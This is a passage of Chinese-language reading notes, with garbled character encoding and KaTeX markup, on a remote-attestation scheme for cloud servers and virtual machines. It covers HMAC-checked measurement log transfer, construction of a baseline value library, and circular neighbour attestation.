aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05278em;">Î²</span></span></span></span>ã€<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">ke</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span></span></span></span>å’Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mi>o</mi><mi>n</mi><mi>c</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">nonce</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord mathnormal">ce</span></span></span></span>ã€‚</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable width="100%"><mtr><mtd width="50%"></mtd><mtd><mrow><mi>Î²</mi><mo separator="true">,</mo><mi>k</mi><mi>e</mi><mo separator="true">,</mo><mi>n</mi><mi>o</mi><mi>n</mi><mi>c</mi><mi>e</mi><mo>=</mo><mi>D</mi><mi>e</mi><msub><mi>c</mi><mrow><mi>E</mi><msub><mi>K</mi><mrow><mi>p</mi><mi>r</mi><mi>i</mi></mrow></msub></mrow></msub><mo stretchy="false">(</mo><msub><mi>M</mi><mn>1</mn></msub><mo stretchy="false">)</mo></mrow></mtd><mtd width="50%"></mtd><mtd><mtext>(3)</mtext></mtd></mtr></mtable><annotation encoding="application/x-tex">\beta,ke,nonce=Dec_{EK_{pri}}(M_1)\tag3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05278em;">Î²</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord mathnormal">ce</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0973em;vertical-align:-0.3473em;"></span><span class="mord mathnormal">De</span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05764em;">E</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:-0.0715em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2819em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.3473em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span><span class="tag"><span class="strut" style="height:1.0973em;vertical-align:-0.3473em;"></span><span class="mord text"><span class="mord">(</span><span class="mord"><span class="mord">3</span></span><span class="mord">)</span></span></span></span></span></span></p><ul><li>äº‘èŠ‚ç‚¹éšååŸºäºç­‰å¼(4)éªŒè¯å¯†æ–‡æ˜¯å¦æŸåã€‚</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable width="100%"><mtr><mtd width="50%"></mtd><mtd><mrow><mi>H</mi><mi>a</mi><mi>s</mi><mi>h</mi><mo stretchy="false">(</mo><mi>A</mi><mi>I</mi><msub><mi>K</mi><mrow><mi>p</mi><mi>u</mi><mi>b</mi></mrow></msub><mo stretchy="false">)</mo><mo>=</mo><mi>Î²</mi></mrow></mtd><mtd width="50%"></mtd><mtd><mtext>(4)</mtext></mtd></mtr></mtable><annotation encoding="application/x-tex">Hash(AIK_{pub})=\beta\tag4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal">h</span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">b</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05278em;">Î²</span></span><span class="tag"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord text"><span class="mord">(</span><span class="mord"><span class="mord">4</span></span><span class="mord">)</span></span></span></span></span></span></p><ul><li>æ­¥éª¤3bï¼š<code>ICA</code>é€šè¿‡è®¾è®¡çš„è¿‡æ»¤æœºåˆ¶æ”¶é›†å’Œè¿‡æ»¤æµ‹é‡æ—¥å¿—( core logï¼Œ<code>ML</code>)ï¼Œä»¥å¯¼å‡ºæ ¸å¿ƒæµ‹é‡æ—¥å¿—(core measurement logï¼Œ<code>CML</code>)ï¼Œåœ¨åéƒ¨åˆ†<strong>Core measurement log</strong>ï¼ˆæ ¸å¿ƒæµ‹é‡æ—¥å¿—ï¼‰ä¸­è¯¦ç»†æè¿°ã€‚ç„¶åï¼Œ<code>ICA</code>ä½¿ç”¨ç­‰å¼(5)å’Œç­‰å¼(6)è®¡ç®—<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>M</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">M_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>ï¼Œå¹¶å°†å…¶ä¼ è¾“åˆ°<code>RM</code>ã€‚</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable width="100%"><mtr><mtd width="50%"></mtd><mtd><mrow><mi>C</mi><mi>M</mi><msup><mi>L</mi><mo mathvariant="normal" lspace="0em" rspace="0em">â€²</mo></msup><mo>=</mo><mi>H</mi><mi>M</mi><mi>A</mi><mi>C</mi><mo stretchy="false">(</mo><mi>C</mi><mi>M</mi><mi>L</mi><mo stretchy="false">)</mo></mrow></mtd><mtd width="50%"></mtd><mtd><mtext>(5)</mtext></mtd></mtr></mtable><annotation encoding="application/x-tex">CML&#x27;=HMAC(CML)\tag5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8019em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">CM</span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">CM</span><span class="mord mathnormal">L</span><span class="mclose">)</span></span><span class="tag"><span class="strut" style="height:1.0519em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">(</span><span class="mord"><span class="mord">5</span></span><span class="mord">)</span></span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable width="100%"><mtr><mtd width="50%"></mtd><mtd><mrow><msub><mi>M</mi><mn>2</mn></msub><mo>=</mo><mi>E</mi><mi>n</mi><msub><mi>c</mi><mrow><mi>k</mi><mi>e</mi></mrow></msub><mo stretchy="false">(</mo><mi>C</mi><mi>M</mi><msup><mi>L</mi><mo mathvariant="normal" lspace="0em" rspace="0em">â€²</mo></msup><mo separator="true">,</mo><mi>C</mi><mi>M</mi><mi>L</mi><mo separator="true">,</mo><mi>n</mi><mi>o</mi><mi>n</mi><mi>c</mi><mi>e</mi><mo stretchy="false">)</mo></mrow></mtd><mtd width="50%"></mtd><mtd><mtext>(6)</mtext></mtd></mtr></mtable><annotation encoding="application/x-tex">M_2=Enc_{ke}(CML&#x27;,CML,nonce)\tag6</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0519em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord mathnormal">n</span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mathnormal mtight">e</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">CM</span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">CM</span><span class="mord mathnormal">L</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord mathnormal">ce</span><span class="mclose">)</span></span><span class="tag"><span class="strut" style="height:1.0519em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">(</span><span class="mord"><span class="mord">6</span></span><span class="mord">)</span></span></span></span></span></span></p><ul><li>æ­¥éª¤4aï¼š<code>RM</code>åœ¨æ¥æ”¶åˆ°<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>M</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">M_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>æ—¶ï¼Œä½¿ç”¨<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">ke</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span></span></span></span>æ¥æå–<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>M</mi><mi>L</mi><mtext>â€™</mtext></mrow><annotation encoding="application/x-tex">CMLâ€™</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">CM</span><span class="mord mathnormal">L</span><span class="mord">â€™</span></span></span></span>ã€<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>M</mi><mi>L</mi></mrow><annotation encoding="application/x-tex">CML</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">CM</span><span class="mord mathnormal">L</span></span></span></span>å’Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mi>o</mi><mi>n</mi><mi>c</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">nonce</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord mathnormal">ce</span></span></span></span>ã€‚æ­¥éª¤4éœ€è¦<code>RM</code>é€šè¿‡å°†éšæœºæ•°ä¸æ­¥éª¤2bä¸­çš„éšæœºæ•°è¿›è¡ŒåŒ¹é…æ¥ç¡®ä¿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>M</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">M_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>æ˜¯æœ€æ–°å‘é€çš„ï¼Œå¹¶æ£€æŸ¥ç­‰å¼(7)æ˜¯å¦æˆç«‹ã€‚å¦‚æœç­‰å¼æˆç«‹ï¼Œåˆ™è¡¨æ˜<code>CML</code>å®Œå¥½æ— æŸï¼Œ<code>RM</code>å°†<code>CML</code>å­˜å‚¨åœ¨åŸºçº¿å€¼åº“ä¸­ã€‚å¦åˆ™ï¼Œ<code>RM</code>ä¼šä¸¢å¼ƒ<code>CML</code>å¹¶è§¦å‘è­¦æŠ¥ã€‚</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable width="100%"><mtr><mtd width="50%"></mtd><mtd><mrow><mi>H</mi><mi>M</mi><mi>A</mi><mi>C</mi><mo stretchy="false">(</mo><mi>C</mi><mi>M</mi><mi>L</mi><mo stretchy="false">)</mo><mo>=</mo><mi>C</mi><mi>M</mi><msup><mi>L</mi><mo mathvariant="normal" lspace="0em" rspace="0em">â€²</mo></msup></mrow></mtd><mtd width="50%"></mtd><mtd><mtext>(7)</mtext></mtd></mtr></mtable><annotation encoding="application/x-tex">HMAC(CML)=CML&#x27;\tag7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">CM</span><span class="mord mathnormal">L</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8019em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">CM</span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span></span></span><span class="tag"><span class="strut" style="height:1.0519em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">(</span><span class="mord"><span class="mord">7</span></span><span class="mord">)</span></span></span></span></span></span></p><h4 id="åŸºå€¼åº“æ„å»ºï¼ˆ-Base-Value-Library-Constructionï¼‰">åŸºå€¼åº“æ„å»ºï¼ˆ Base Value Library Constructionï¼‰</h4><p><strong>å®šä¹‰1</strong>â€”â€”ä¸´æ—¶æ–‡ä»¶</p><p>é€šå¸¸ç”¨äºæ•°æ®å­˜å‚¨æˆ–è®¡ç®—ä»»åŠ¡ã€‚å®ƒçš„ç”Ÿå‘½å‘¨æœŸå¾ˆçŸ­ï¼Œåªå­˜åœ¨äºç›¸å…³çš„ä»»åŠ¡æˆ–ä¼šè¯ä¸­ï¼Œå¹¶åœ¨å®Œæˆåè‡ªåŠ¨åˆ é™¤æˆ–æ¸…é™¤ã€‚</p><p><strong>å®šä¹‰2</strong>â€”â€”æ ¸å¿ƒæ–‡ä»¶</p><p>å¦‚æœä¸€ä¸ªæ–‡ä»¶å¯ä»¥é€šè¿‡å®ƒçš„æ–‡ä»¶ååœ¨ä»»ä½•æ—¶å€™è¢«è®¿é—®ï¼Œé‚£ä¹ˆè¿™ä¸ªæ–‡ä»¶å°±è¢«å½’ç±»ä¸ºæ ¸å¿ƒæ–‡ä»¶ã€‚å› æ­¤ï¼Œæ ¸å¿ƒæµ‹é‡æ—¥å¿—å’ŒåŸºçº¿åº“ä¸­çš„æ‰€æœ‰æ–‡ä»¶éƒ½æ˜¯æ ¸å¿ƒæ–‡ä»¶ã€‚</p><ol><li><p>æ ¸å¿ƒæµ‹é‡æ—¥å¿—ï¼ˆCore measurement logï¼‰</p><p>æ ¸å¿ƒæµ‹é‡æ—¥å¿—ï¼ˆ<code>CML</code>ï¼‰çš„è·å–ç®—æ³•ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//Input : Measurement Log(ML)</span><br><span class="hljs-comment">//Output: Core Measurement Log(CML)</span><br>Core_Measurement_Log = []<br><span class="hljs-keyword">for</span> each Measurement_log_entry in ML <span class="hljs-keyword">do</span><br>    file_name = extract(Measurement_log_entry)<br>    file_is_exist = file_exsits_in_system(file_name)<br>    <span class="hljs-comment">// If the file exists, put it to the CML; otherwise, skip it</span><br>    <span class="hljs-keyword">if</span> file_is_exist then<br>    Core_Measurement_Log.append(file_name)<br>    end<br>end<br><span class="hljs-keyword">return</span> Core_Measurement_Log(CML)<br></code></pre></td></tr></table></figure><p><code>ICA</code>é¡ºåºè¯»å–<code>ML</code>ä¸­çš„æ¯ä¸ªæ¡ç›®ï¼Œå¹¶æå–ç›¸åº”çš„æ–‡ä»¶è·¯å¾„(å³æ–‡ä»¶åå­—æ®µ)(ç¬¬2-3è¡Œ)ã€‚ç„¶åï¼Œå®ƒæ ¹æ®æå–çš„æ–‡ä»¶è·¯å¾„æ£€æŸ¥Linuxç³»ç»Ÿä¸­æ˜¯å¦å­˜åœ¨è¿™ä¸ªæ–‡ä»¶(ç¬¬4è¡Œ)ã€‚å¦‚æœæ–‡ä»¶å­˜åœ¨ï¼Œå®ƒè¢«è®¤ä¸ºæ˜¯æ ¸å¿ƒæ–‡ä»¶ï¼Œå¹¶ä¸”<code>ML</code>ä¸­çš„ç›¸åº”æ¡ç›®è¢«æ·»åŠ åˆ°<code>CML</code>ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œå®ƒå°†è¢«è§†ä¸ºä¸´æ—¶æ–‡ä»¶ï¼Œè¢«è·³è¿‡ï¼Œå¹¶ä¸”ä¸ä¼šæ·»åŠ åˆ°<code>CML</code>ä¸­(ç¬¬5-7è¡Œ)ã€‚åœ¨ç”¨è¯¥ç®—æ³•éå†æ•´ä¸ª<code>ML</code>ä¹‹åï¼Œç”Ÿæˆ<code>CML</code>ã€‚</p></li><li><p>åŸºçº¿å€¼çš„å­˜å‚¨ï¼ˆStorage of baseline valuesï¼‰</p><p>åŸºçº¿å€¼åº“ç”±å­˜å‚¨åœ¨<code>CMC</code>ä¸­çš„å¤šä¸ªåŸºçº¿å€¼æ–‡ä»¶ç»„æˆã€‚åŸºçº¿å€¼æ˜¯äº‘èŠ‚ç‚¹å®Œæˆæ³¨å†Œåå‘é€ç»™<code>RM</code>çš„<code>CML</code>ã€‚åŸºçº¿å€¼åº“ä½¿ç”¨æ·±åº¦ä¸º3çš„å¤šå‰æ ‘æ„å»ºï¼Œä»¥~~â€œTâ€~~ä¸ºæ ¹ã€‚åœ¨è¿™ä¸ªç»“æ„ä¸­ï¼Œæ¯ä¸ªå­èŠ‚ç‚¹ä»£è¡¨ä¸€ä¸ªCSï¼Œç›¸åº”çš„CSçš„åŸºçº¿å€¼å­˜å‚¨åœ¨å…¶å¯¹åº”çš„å­èŠ‚ç‚¹ä¸Šã€‚</p><p>æ¯ä¸ªå¶èŠ‚ç‚¹ä»£è¡¨ä¸€ä¸ªè™šæ‹Ÿæœº(<code>VM</code>)ï¼Œè™šæ‹Ÿæœºçš„åŸºå‡†å€¼å­˜å‚¨åœ¨ç›¸åº”çš„å¶èŠ‚ç‚¹ä¸Šã€‚å¶èŠ‚ç‚¹çš„çˆ¶èŠ‚ç‚¹æ˜¯æ‰˜ç®¡å¯¹åº”äºè¯¥å¶èŠ‚ç‚¹çš„è™šæ‹Ÿæœºçš„äº‘æœåŠ¡ã€‚</p><p>å¦‚å›¾</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241123133710868.png" alt="image-20241123133710868"></p><p>ä½¿ç”¨æ ‘ç»“æ„å­˜å‚¨åŸºçº¿å€¼å‚ä¸è®¡ç®—ä»»åŠ¡çš„è™šæ‹Ÿæœºå’Œäº‘æœåŠ¡å™¨å¯ä»¥åŠ¨æ€åœ°åŠ å…¥æˆ–ç¦»å¼€ã€‚</p></li></ol><h2 id="ç–‘é—®">ç–‘é—®</h2><p>ä¸´æ—¶æ–‡ä»¶æ˜¯åªå­˜åœ¨äºç›¸å…³çš„ä»»åŠ¡æˆ–ä¼šè¯ä¸­ï¼Œå¹¶åœ¨å®Œæˆåè‡ªåŠ¨åˆ é™¤æˆ–æ¸…é™¤çš„æ–‡ä»¶ï¼Œä½†æ˜¯å¦‚æœåœ¨æ£€æŸ¥çš„æ—¶å€™ä¸´æ—¶æ–‡ä»¶è¿˜æœªå®Œæˆä»»åŠ¡ä»è€Œæœªè¢«åˆ é™¤ï¼Œæ˜¯ä¸æ˜¯ä¼šè¯¯åˆ¤è¯¥æ–‡ä»¶ä¸ºæ ¸å¿ƒæ–‡ä»¶ï¼Ÿ</p><p>æ˜¯å¦æ˜¯å› ä¸ºä¸´æ—¶æ–‡ä»¶åœ¨äº§ç”Ÿæ—¶ä¸ä¼šå°†æ–‡ä»¶è·¯å¾„ï¼ˆfile_nameï¼‰è®°å½•åœ¨æ–‡ä»¶æ ¼å¼ä¸­?</p><p>åŸºçº¿å€¼å­˜å‚¨æ—¶ï¼Œæ„å»ºå¤šå‰æ ‘çš„æ ¹&quot;T&quot;è¡¨ç¤ºçš„æ˜¯ä»€ä¹ˆï¼Ÿ</p><h3 id="Circular-Remote-attestation">Circular Remote attestation</h3><p><strong>Task Issued</strong></p><p>åœ¨äº‘ç¯å¢ƒä¸­ï¼ŒæœåŠ¡å™¨å’Œè™šæ‹Ÿæœºçš„ä½ç½®ç›¸å¯¹ç¨³å®šï¼Œè™šæ‹Ÿæœºçš„å¯ä¿¡åº¦ç”±è™šæ‹Ÿæœºæœ¬èº«åŠå…¶ä¸»æœåŠ¡å™¨å…±åŒå†³å®šã€‚æ ¹æ®è¿™ä¸€ç‰¹ç‚¹ï¼Œè¯¥æ–‡æå‡ºäº†ä¸€ç§å¾ªç¯é‚»å±…åä½œè®¤è¯æ–¹æ³•ã€‚</p><p>åœ¨è¿™ç§æ–¹æ³•ä¸­ï¼Œäº‘æœåŠ¡å™¨æ—¢æ˜¯éªŒè¯è€…ï¼Œåˆæ˜¯è¯æ˜è€…ã€‚å¦‚å›¾ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241123134537787.png" alt="image-20241123134537787"></p><p><strong>å®šä¹‰3</strong>â€”â€”è¿œç¨‹éªŒè¯é¡ºåºï¼š</p><p>å¯¹äºç»™å®šçš„äº‘æœåŠ¡å™¨åºåˆ—<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>C</mi><msub><mi>S</mi><mn>1</mn></msub><mo separator="true">,</mo><mi>C</mi><msub><mi>S</mi><mn>2</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mi>C</mi><msub><mi>S</mi><mi>i</mi></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mi>C</mi><msub><mi>S</mi><mrow><mi>n</mi><mo>âˆ’</mo><mn>1</mn></mrow></msub><mo separator="true">,</mo><mi>C</mi><msub><mi>S</mi><mi>n</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(CS_1,CS_2,...,CS_i,...,CS_{n-1},CS_n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span 